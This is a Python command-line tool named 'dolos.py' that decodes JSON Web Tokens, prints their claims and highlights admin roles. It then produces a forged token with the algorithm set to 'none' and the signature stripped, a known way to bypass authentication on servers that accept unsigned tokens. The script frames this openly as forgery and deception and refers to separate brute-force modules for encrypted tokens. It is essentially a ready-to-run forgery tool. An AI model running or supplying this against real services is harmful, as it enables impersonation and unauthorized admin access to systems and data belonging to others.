import sys
import json
import base64
from authlib.jose import jwt
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

def b64_decode(data):
    """Universal URL-safe Base64 decoder with padding fix."""
    try:
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        return base64.urlsafe_b64decode(data)
    except Exception:
        return None

def forge_guile_token(header, payload):
    """DOLOS Guile Module: Generates a forged 'alg:none' variant."""
    try:
        fraud_header = header.copy()
        fraud_header['alg'] = 'none'
        
        # Re-encode for deception
        h_b64 = base64.urlsafe_b64encode(json.dumps(fraud_header).encode()).decode().rstrip("=")
        p_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        
        return f"{h_b64}.{p_b64}."
    except Exception:
        return "Extraction failed."

def analyze_token(token):
    # --- DOLOS NEURAL BOOT SEQUENCE ---
    console.print("[bold blue]>>> DOLOS INTERFACE ACTIVE: DEPLOYING GUILE...[/bold blue]")
    
    parts = token.split('.')
    num_parts = len(parts)

    header_raw = b64_decode(parts[0])
    header = json.loads(header_raw) if header_raw else {"error": "Invalid Header"}

    # 1. UI LAYOUT: THE DOLOS HUB
    table = Table(title="[bold magenta]DOLOS NEURAL EXTRACTION HUB[/bold magenta]", border_style="cyan")
    table.add_column("COMPONENT", style="bold green")
    table.add_column("METADATA / VALUE", style="white")

    table.add_row("IDENTITY", f"{'JWE (Encrypted)' if num_parts == 5 else 'JWS (Signed)'}")
    table.add_row("ALGORITHM", f"{header.get('alg', 'UNKNOWN')}")
    table.add_row("TRICKERY", f"Ready for forgery" if num_parts == 3 else "Awaiting decryption")
    
    console.print(table)

    # 2. PAYLOAD & TRICKERY MODULE
    try:
        if num_parts == 5:
            console.print(Panel(f"Method: {header.get('enc')}\nAction: Passing to Kratos-X brute-force modules.", 
                                title="[red]ENCRYPTED VAULT[/red]", border_style="red"))
        else:
            payload_raw = b64_decode(parts[1])
            payload = json.loads(payload_raw)
            payload_json = json.dumps(payload, indent=4)
            
            console.print(Panel(payload_json, title="[bold green]EXTRACTED NEURAL CLAIMS[/bold green]", border_style="green"))

            # DOLOS AUTOMATED BUG FINDING
            if payload.get("admin") is True or payload.get("role") == "admin":
                console.print(Panel.fit("[blink bold white on red] !!! CRITICAL: ADMIN PRIVILEGES DETECTED !!! [/blink bold white on red]"))
            
            # GENERATE FORGERY (THE TRICKERY)
            forged = forge_guile_token(header, payload)
            console.print(Panel(forged, title="[bold yellow]DOLOS FORGED TOKEN (alg:none)[/bold yellow]", border_style="yellow"))

    except Exception as e:
        console.print(f"[bold red]>>> NEURAL DECODE FAILURE: {str(e)}[/bold red]")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        console.print("[yellow]Usage: python3 dolos.py <token>[/yellow]")
    else:
        analyze_token(sys.argv[1])